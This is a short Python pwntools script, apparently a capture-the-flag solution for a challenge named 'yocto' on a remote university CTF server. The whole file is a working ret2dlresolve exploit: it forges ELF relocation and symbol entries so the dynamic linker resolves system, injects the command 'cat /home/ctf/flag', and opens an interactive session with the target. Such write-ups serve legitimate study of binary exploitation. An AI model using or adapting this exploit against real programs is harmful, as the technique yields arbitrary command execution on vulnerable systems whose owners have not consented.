#!/usr/bin/env python

from pwn import *

# r = process('./yocto')
r = remote('bamboofox.cs.nctu.edu.tw', 11008)

plt0 = 0x80482a0
relplt = 0x8048270
dynsym = 0x804818c
dynstr = 0x80481fc
buf = 0x80495c0
offset = 36
data = buf + offset
atoi_got = 0x8049548

fake = flat(
        atoi_got, 0x7 | ((data + 8 - dynsym) / 16) << 8,
        data + 24 - dynstr, 0, 0, 0x12,
        'system\x00\x00'
        )

payload = map(str, [0, data - relplt, plt0])
payload = '.'.join(payload)
payload += ';cat /home/ctf/flag;'

r.sendline(payload.ljust(offset) + fake)

r.interactive()
